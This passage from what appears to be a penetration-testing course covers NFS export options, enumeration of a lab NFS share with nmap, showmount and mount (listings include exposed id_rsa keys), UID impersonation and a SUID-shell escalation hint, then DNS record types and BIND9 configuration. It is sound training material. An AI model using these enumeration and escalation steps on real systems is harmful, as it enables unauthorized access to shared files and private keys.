<span class="hljs-meta"># Example for NFSv4:</span>
<span class="hljs-meta"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span>
<span class="hljs-meta"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span>
</code></pre>
<p>The default <code>exports</code> file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets.</p>
<table>
<thead>
<tr>
<th><strong>Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rw</code></td>
<td>Read and write permissions.</td>
</tr>
<tr>
<td><code>ro</code></td>
<td>Read only permissions.</td>
</tr>
<tr>
<td><code>sync</code></td>
<td>Synchronous data transfer. (A bit slower)</td>
</tr>
<tr>
<td><code>async</code></td>
<td>Asynchronous data transfer. (A bit faster)</td>
</tr>
<tr>
<td><code>secure</code></td>
<td>Ports above 1024 will not be used.</td>
</tr>
<tr>
<td><code>insecure</code></td>
<td>Ports above 1024 will be used.</td>
</tr>
<tr>
<td><code>no_subtree_check</code></td>
<td>This option disables the checking of subdirectory trees.</td>
</tr>
<tr>
<td><code>root_squash</code></td>
<td>Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents <code>root</code> from accessing files on an NFS mount.</td>
</tr>
</tbody>
</table>
<p>Let us create such an entry for test purposes and play around with the settings.</p>
<p><strong>ExportFS</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@nfs</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' &gt;&gt; /etc/exports</span>
root<span class="hljs-variable">@nfs</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># systemctl restart nfs-kernel-server </span>
root<span class="hljs-variable">@nfs</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># exportfs</span>

/mnt/nfs          <span class="hljs-number">10.129</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span>
</code></pre>
<p>We have shared the folder <code>/mnt/nfs</code> to the subnet <code>10.129.14.0/24</code> with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:</p>
<table>
<thead>
<tr>
<th><strong>Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rw</code></td>
<td>Read and write permissions.</td>
</tr>
<tr>
<td><code>insecure</code></td>
<td>Ports above 1024 will be used.</td>
</tr>
<tr>
<td><code>nohide</code></td>
<td>If another file system was mounted below an exported directory, this directory is exported by its own exports entry.</td>
</tr>
<tr>
<td><code>no_root_squash</code></td>
<td>All files created by root are kept with the UID/GID 0.</td>
</tr>
</tbody>
</table>
<p>It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.</p>
<p>We can take a look at the <code>insecure</code> option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>When footprinting NFS, the TCP ports <code>111</code> and <code>2049</code> are essential. We can also get information about the NFS service and the host via RPC, as shown below in the example.</p>
<p><strong>Nmap</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span>
| rpcinfo: 
|   program version    port/proto  service
|  <span class="hljs-number"> 100000 </span> 2,3,4        111/tcp   rpcbind
|  <span class="hljs-number"> 100000 </span> 2,3,4        111/udp   rpcbind
|  <span class="hljs-number"> 100000 </span> 3,4          111/tcp6  rpcbind
|  <span class="hljs-number"> 100000 </span> 3,4          111/udp6  rpcbind
|  <span class="hljs-number"> 100003 </span><span class="hljs-number"> 3 </span>          2049/udp   nfs
|  <span class="hljs-number"> 100003 </span><span class="hljs-number"> 3 </span>          2049/udp6  nfs
|  <span class="hljs-number"> 100003 </span> 3,4         2049/tcp   nfs
|  <span class="hljs-number"> 100003 </span> 3,4         2049/tcp6  nfs
|  <span class="hljs-number"> 100005 </span> 1,2,3      41982/udp6  mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      45837/tcp   mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      47217/tcp6  mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      58830/udp   mountd
|  <span class="hljs-number"> 100021 </span> 1,3,4      39542/udp   nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      44629/tcp   nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      45273/tcp6  nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      47524/udp6  nlockmgr
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/tcp   nfs_acl
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/tcp6  nfs_acl
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/udp   nfs_acl
|_ <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/udp6  nfs_acl
2049/tcp open  nfs_acl<span class="hljs-number"> 3 </span>(RPC <span class="hljs-comment">#100227)</span>
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done:<span class="hljs-number"> 1 </span>IP address (1 host up) scanned in 6.58 seconds
</code></pre>
<p>The <code>rpcinfo</code> NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. Also, for NFS, Nmap has some NSE scripts that can be used for the scans. These can then show us, for example, the <code>contents</code> of the share and its <code>stats</code>.</p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span>
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx  <span class="hljs-number"> 65534 </span><span class="hljs-number"> 65534 </span><span class="hljs-number"> 4096 </span> 2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--  <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 1872 </span> 2021-09-19T15:27:42  id_rsa
| rw-r--r--  <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 348 </span>  2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--  <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo: 
|   program version    port/proto  service
|  <span class="hljs-number"> 100000 </span> 2,3,4        111/tcp   rpcbind
|  <span class="hljs-number"> 100000 </span> 2,3,4        111/udp   rpcbind
|  <span class="hljs-number"> 100000 </span> 3,4          111/tcp6  rpcbind
|  <span class="hljs-number"> 100000 </span> 3,4          111/udp6  rpcbind
|  <span class="hljs-number"> 100003 </span><span class="hljs-number"> 3 </span>          2049/udp   nfs
|  <span class="hljs-number"> 100003 </span><span class="hljs-number"> 3 </span>          2049/udp6  nfs
|  <span class="hljs-number"> 100003 </span> 3,4         2049/tcp   nfs
|  <span class="hljs-number"> 100003 </span> 3,4         2049/tcp6  nfs
|  <span class="hljs-number"> 100005 </span> 1,2,3      41982/udp6  mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      45837/tcp   mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      47217/tcp6  mountd
|  <span class="hljs-number"> 100005 </span> 1,2,3      58830/udp   mountd
|  <span class="hljs-number"> 100021 </span> 1,3,4      39542/udp   nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      44629/tcp   nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      45273/tcp6  nlockmgr
|  <span class="hljs-number"> 100021 </span> 1,3,4      47524/udp6  nlockmgr
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/tcp   nfs_acl
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/tcp6  nfs_acl
|  <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/udp   nfs_acl
|_ <span class="hljs-number"> 100227 </span><span class="hljs-number"> 3 </span>          2049/udp6  nfs_acl
2049/tcp open  nfs_acl<span class="hljs-number"> 3 </span>(RPC <span class="hljs-comment">#100227)</span>
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done:<span class="hljs-number"> 1 </span>IP address (1 host up) scanned in 0.45 seconds
</code></pre>
<p>Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system.</p>
<p><strong>Show Available NFS Shares</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ showmount -e <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>

Export list for <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>:
/mnt/nfs <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.0</span>/<span class="hljs-number">24</span>
</code></pre>
<p><strong>Mounting NFS Share</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mkdir target-NFS
root@htb[<span class="hljs-regexp">/htb]$ sudo mount -t nfs 10.129.14.128:/</span> .<span class="hljs-regexp">/target-NFS/</span> -o nolock
root@htb[/htb]$ cd target-NFS
root@htb[/htb]$ tree .

.
 mnt
     nfs
         id_rsa
         id_rsa.pub
         nfs.share

<span class="hljs-number">2</span> directories, <span class="hljs-number">3</span> files
</code></pre>
<p>There we will have the opportunity to access the rights and the usernames and groups to whom the shown and viewable files belong. Because once we have the usernames, group names, UIDs, and GUIDs, we can create them on our system and adapt them to the NFS share to view and modify the files.</p>
<p><strong>List Contents with Usernames &amp; Group Names</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -l mnt/nfs/

total 16
-rw-r--r--<span class="hljs-number"> 1 </span>cry0l1t3 cry0l1t3<span class="hljs-number"> 1872 </span>Sep<span class="hljs-number"> 25 </span>00:55 cry0l1t3.priv
-rw-r--r--<span class="hljs-number"> 1 </span>cry0l1t3 cry0l1t3 <span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 25 </span>00:55 cry0l1t3.pub
-rw-r--r--<span class="hljs-number"> 1 </span>root     root    <span class="hljs-number"> 1872 </span>Sep<span class="hljs-number"> 19 </span>17:27 id_rsa
-rw-r--r--<span class="hljs-number"> 1 </span>root     root     <span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 19 </span>17:28 id_rsa.pub
-rw-r--r--<span class="hljs-number"> 1 </span>root     root       <span class="hljs-number"> 0 </span>Sep<span class="hljs-number"> 19 </span>17:22 nfs.share
</code></pre>
<p><strong>List Contents with UIDs &amp; GUIDs</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -n mnt/nfs/

total 16
-rw-r--r--<span class="hljs-number"> 1 </span>1000<span class="hljs-number"> 1000 </span>1872 Sep<span class="hljs-number"> 25 </span>00:55 cry0l1t3.priv
-rw-r--r--<span class="hljs-number"> 1 </span>1000<span class="hljs-number"> 1000 </span><span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 25 </span>00:55 cry0l1t3.pub
-rw-r--r--<span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span>1000<span class="hljs-number"> 1221 </span>Sep<span class="hljs-number"> 19 </span>18:21 backup.sh
-rw-r--r--<span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span>1872 Sep<span class="hljs-number"> 19 </span>17:27 id_rsa
-rw-r--r--<span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 348 </span>Sep<span class="hljs-number"> 19 </span>17:28 id_rsa.pub
-rw-r--r--<span class="hljs-number"> 1 </span>  <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span>Sep<span class="hljs-number"> 19 </span>17:22 nfs.share
</code></pre>
<p>It is important to note that if the <code>root_squash</code> option is set, we cannot edit the <code>backup.sh</code> file even as <code>root</code>.</p>
<p>We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the <code>SUID</code> of that user and then run the shell via the SSH user.</p>
<p>After we have done all the necessary steps and obtained the information we need, we can unmount the NFS share.</p>
<p><strong>Unmounting</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ cd ..
root<span class="hljs-meta">@htb</span>[/htb]$ sudo umount ./<span class="hljs-keyword">target</span>-NFS
</code></pre>
<h2 id="dns">DNS</h2>
<hr>
<p><code>Domain Name System</code> (<code>DNS</code>) is an integral part of the Internet. For example, through domain names, such as <a href="https://academy.hackthebox.com/">academy.hackthebox.com</a> or <a href="https://www.hackthebox.eu/">www.hackthebox.com</a>, we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database. Simplified, we can imagine it like a library with many different phone books. The information is distributed over many thousands of name servers. Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:</p>
<ul>
<li>DNS root server</li>
<li>Authoritative name server</li>
<li>Non-authoritative name server</li>
<li>Caching server</li>
<li>Forwarding server</li>
<li>Resolver</li>
</ul>
<table>
<thead>
<tr>
<th><strong>Server Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>DNS Root Server</code></td>
<td>The root servers of the DNS are responsible for the top-level domains (<code>TLD</code>). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The <a href="https://www.icann.org/">Internet Corporation for Assigned Names and Numbers</a> (<code>ICANN</code>) coordinates the work of the root name servers. There are <code>13</code> such root servers around the globe.</td>
</tr>
<tr>
<td><code>Authoritative Nameserver</code></td>
<td>Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client&#39;s query, the root name server takes over at that point.</td>
</tr>
<tr>
<td><code>Non-authoritative Nameserver</code></td>
<td>Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.</td>
</tr>
<tr>
<td><code>Caching DNS Server</code></td>
<td>Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.</td>
</tr>
<tr>
<td><code>Forwarding Server</code></td>
<td>Forwarding servers perform only one function: they forward DNS queries to another DNS server.</td>
</tr>
<tr>
<td><code>Resolver</code></td>
<td>Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.</td>
</tr>
</tbody>
</table>
<p>DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply <code>DNS over TLS</code> (<code>DoT</code>) or <code>DNS over HTTPS</code> (<code>DoH</code>) here. In addition, the network protocol <code>DNSCrypt</code> also encrypts the traffic between the computer and the name server.</p>
<p>However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain&#39;s name servers are called.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/27/tooldev-dns.png" alt=""></p>
<p>Different <code>DNS records</code> are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.</p>
<table>
<thead>
<tr>
<th><strong>DNS Record</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>A</code></td>
<td>Returns an IPv4 address of the requested domain as a result.</td>
</tr>
<tr>
<td><code>AAAA</code></td>
<td>Returns an IPv6 address of the requested domain.</td>
</tr>
<tr>
<td><code>MX</code></td>
<td>Returns the responsible mail servers as a result.</td>
</tr>
<tr>
<td><code>NS</code></td>
<td>Returns the DNS servers (nameservers) of the domain.</td>
</tr>
<tr>
<td><code>TXT</code></td>
<td>This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.</td>
</tr>
<tr>
<td><code>CNAME</code></td>
<td>This record serves as an alias. If the domain www.hackthebox.eu should point to the same IP, and we create an A record for one and a CNAME record for the other.</td>
</tr>
<tr>
<td><code>PTR</code></td>
<td>The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.</td>
</tr>
<tr>
<td><code>SOA</code></td>
<td>Provides information about the corresponding DNS zone and email address of the administrative contact.</td>
</tr>
</tbody>
</table>
<p>The <code>SOA</code> record is located in a domain&#39;s zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.</p>
<p>DNS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ dig soa www.inlanefreight.com

; &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">DiG</span> 9<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.27-Debian</span> &lt;&lt;&gt;&gt; <span class="hljs-selector-tag">soa</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>
;; <span class="hljs-selector-tag">global</span> <span class="hljs-selector-tag">options</span>: +<span class="hljs-selector-tag">cmd</span>
;; <span class="hljs-selector-tag">Got</span> <span class="hljs-selector-tag">answer</span>:
;; <span class="hljs-selector-tag">-</span>&gt;&gt;<span class="hljs-selector-tag">HEADER</span>&lt;&lt;<span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">opcode</span>: <span class="hljs-selector-tag">QUERY</span>, <span class="hljs-selector-tag">status</span>: <span class="hljs-selector-tag">NOERROR</span>, <span class="hljs-selector-tag">id</span>: 15876
;; <span class="hljs-selector-tag">flags</span>: <span class="hljs-selector-tag">qr</span> <span class="hljs-selector-tag">rd</span> <span class="hljs-selector-tag">ra</span>; <span class="hljs-selector-tag">QUERY</span>: 1, <span class="hljs-selector-tag">ANSWER</span>: 0, <span class="hljs-selector-tag">AUTHORITY</span>: 1, <span class="hljs-selector-tag">ADDITIONAL</span>: 1

;; <span class="hljs-selector-tag">OPT</span> <span class="hljs-selector-tag">PSEUDOSECTION</span>:
; <span class="hljs-selector-tag">EDNS</span>: <span class="hljs-selector-tag">version</span>: 0, <span class="hljs-selector-tag">flags</span>:; <span class="hljs-selector-tag">udp</span>: 512
;; <span class="hljs-selector-tag">QUESTION</span> <span class="hljs-selector-tag">SECTION</span>:
;<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.com</span>.         <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">SOA</span>

;; <span class="hljs-selector-tag">AUTHORITY</span> <span class="hljs-selector-tag">SECTION</span>:
<span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.com</span>.      900     <span class="hljs-selector-tag">IN</span>      <span class="hljs-selector-tag">SOA</span>     <span class="hljs-selector-tag">ns-161</span><span class="hljs-selector-class">.awsdns-20</span><span class="hljs-selector-class">.com</span>. <span class="hljs-selector-tag">awsdns-hostmaster</span><span class="hljs-selector-class">.amazon</span><span class="hljs-selector-class">.com</span>. 1 7200 900 1209600 86400

;; <span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">time</span>: 16 <span class="hljs-selector-tag">msec</span>
;; <span class="hljs-selector-tag">SERVER</span>: 8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-id">#53</span>(8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span>)
;; <span class="hljs-selector-tag">WHEN</span>: <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Jan</span> 05 12<span class="hljs-selector-pseudo">:56</span><span class="hljs-selector-pseudo">:10</span> <span class="hljs-selector-tag">GMT</span> 2023
;; <span class="hljs-selector-tag">MSG</span> <span class="hljs-selector-tag">SIZE</span>  <span class="hljs-selector-tag">rcvd</span>: 128
</code></pre>
<p>The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is <code>awsdns-hostmaster@amazon.com</code>.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>There are many different configuration types for DNS. Therefore, we will only discuss the most important ones to illustrate better the functional principle from an administrative point of view. All DNS servers work with three different types of configuration files:</p>
<ol>
<li>local DNS configuration files</li>
<li>zone files</li>
<li>reverse name resolution files</li>
</ol>
<p>The DNS server <a href="https://www.isc.org/bind/">Bind9</a> is very often used on Linux-based distributions. Its local configuration file (<code>named.conf</code>) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:</p>
<ul>
<li><code>named.conf.local</code></li>
<li><code>named.conf.options</code></li>
<li><code>named.conf.log</code></li>
</ul>
<p>It contains the associated RFC where we can customize the server to our needs and our domain structure with the individual zones for different domains. The configuration file <code>named.conf</code> is divided into several options that control the behavior of the name server. A distinction is made between <code>global options</code> and <code>zone options</code>.</p>
<p>Global options are general and affect all zones. A zone option only affects the zone to which it is assigned. Options not listed in named.conf have default values. If an option is both global and zone-specific, then the zone option takes precedence.</p>
<p><strong>Local DNS Configuration</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@bind9:~# <span class="hljs-keyword">cat</span> /etc/bind/named.<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">local</span>

<span class="hljs-comment">//</span>
<span class="hljs-comment">// Do any local configuration here</span>
<span class="hljs-comment">//</span>

<span class="hljs-comment">// Consider adding the 1918 zones here, if they are not used in your</span>
<span class="hljs-comment">// organization</span>
<span class="hljs-comment">//include "/etc/bind/zones.rfc1918";</span>
zone <span class="hljs-string">"domain.com"</span> {
    <span class="hljs-keyword">type</span> master;
    <span class="hljs-keyword">file</span> <span class="hljs-string">"/etc/bind/db.domain.com"</span>;
    allow-<span class="hljs-keyword">update</span> { key rndc-key; };
};
</code></pre>
<p>In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. In addition, many different options extend or reduce the functionality. We can look these up on the <a href="https://wiki.debian.org/Bind9">documentation</a> of Bind9.</p>
<p>A <code>zone file</code> is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one <code>SOA</code> record and at least one <code>NS</code> record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a <code>SERVFAIL</code> error message.</p>
<p>In short, here, all <code>forward records</code> are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.</p>
<p><strong>Zone Files</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@bind9:~# cat /etc/bind/db.domain.com

<span class="hljs-comment">;</span>
<span class="hljs-comment">; BIND reverse data file for local loopback interface</span>
<span class="hljs-comment">;</span>
<span class="hljs-meta">$ORIGIN</span> domain.com
<span class="hljs-meta">$TTL</span> <span class="hljs-number">86400</span>
@     <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">SOA</span>    dns1.domain.com.     hostmaster.domain.com. (
                    <span class="hljs-number">2001062501</span> <span class="hljs-comment">; serial</span>
                    <span class="hljs-number">21600</span>      <span class="hljs-comment">; refresh after 6 hours</span>
                    <span class="hljs-number">3600</span>       <span class="hljs-comment">; retry after 1 hour</span>
                    <span class="hljs-number">604800</span>     <span class="hljs-comment">; expire after 1 week</span>
                    <span class="hljs-number">86400</span> )    <span class="hljs-comment">; minimum TTL of 1 day</span>

      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">NS</span>     ns1.domain.com.
      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">NS</span>     ns2.domain.com.

      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">MX</span>     <span class="hljs-number">10</span>     mx.domain.com.
      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">MX</span>     <span class="hljs-number">20</span>     mx2.domain.com.

             <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.14.5</span>

server1      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.14.5</span>
server2      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.14.7</span>
ns1          <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.14.2</span>
ns2          <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">A</span>       <span class="hljs-number">10.129.14.3</span>

ftp          <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">CNAME</span>   server1
mx           <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">CNAME</span>   server1
mx2          <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">CNAME</span>   server2
www          <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">CNAME</span>   server2
</code></pre>
<p>For the IP address to be resolved from the <code>Fully Qualified Domain Name</code> (<code>FQDN</code>), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a <code>PTR</code> record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.</p>
<p><strong>Reverse Name Resolution Zone Files</strong></p>
<p>DNS</p>
<pre><code class="lang-shell-session">root@bind9:~# cat /etc/bind/db.<span class="hljs-number">10.129.14</span>

<span class="hljs-comment">;</span>
<span class="hljs-comment">; BIND reverse data file for local loopback interface</span>
<span class="hljs-comment">;</span>
<span class="hljs-meta">$ORIGIN</span> <span class="hljs-number">14.129.10</span>.in-addr.arpa
<span class="hljs-meta">$TTL</span> <span class="hljs-number">86400</span>
@     <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">SOA</span>    dns1.domain.com.     hostmaster.domain.com. (
                    <span class="hljs-number">2001062501</span> <span class="hljs-comment">; serial</span>
                    <span class="hljs-number">21600</span>      <span class="hljs-comment">; refresh after 6 hours</span>
                    <span class="hljs-number">3600</span>       <span class="hljs-comment">; retry after 1 hour</span>
                    <span class="hljs-number">604800</span>     <span class="hljs-comment">; expire after 1 week</span>
                    <span class="hljs-number">86400</span> )    <span class="hljs-comment">; minimum TTL of 1 day</span>

      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">NS</span>     ns1.domain.com.
      <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">NS</span>     ns2.domain.com.

<span class="hljs-number">5</span>    <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">PTR</span>    server1.domain.com.
<span class="hljs-number">7</span>    <span class="hljs-keyword">IN</span>     <span class="hljs-keyword">MX</span>     mx.domain.com.
...SNIP...
</code></pre>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>There are many ways in which a DNS server can be attacked. For example, a list of vulnerabilities targeting the BIND9 server can be found at <a href="https://www.cvedetails.com/product/144/ISC-Bind.html?vendor\_id=64">CVEdetails</a>. In addition, SecurityTrails provides a short <a href="https://securitytrails.com/blog/most-popular-types-dns-attacks">list</a> of the most popular attacks on DNS servers.</p>
<p>Some of the settings we can see below lead to these vulnerabilities, among others. Because DNS can get very complicated and it is very easy for errors to creep into this service, forcing an administrator to work around the problem until they find an exact solution. This often leads to elements being released so that parts of the infrastructure function as planned and desired. In such cases, functionality has a higher priority than security, which leads to misconfigurations and vulnerabilities.</p>
<table>
<thead>
<tr>
<th><strong>Option</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>allow-query</code></td>
<td>Defines which hosts are allowed to send requests to the DNS server.</td>
</tr>
<tr>
<td><code>allow-recursion</code></td>
<td>Defines which hosts are allowed to send recursive requests to the DNS server.</td>
</tr>
<tr>
<td><code>allow-transfer</code></td>
<td>Defines which hosts are allowed to receive zone transfers from the DNS server.</td>
</tr>
<tr>
<td><code>zone-statistics</code></td>
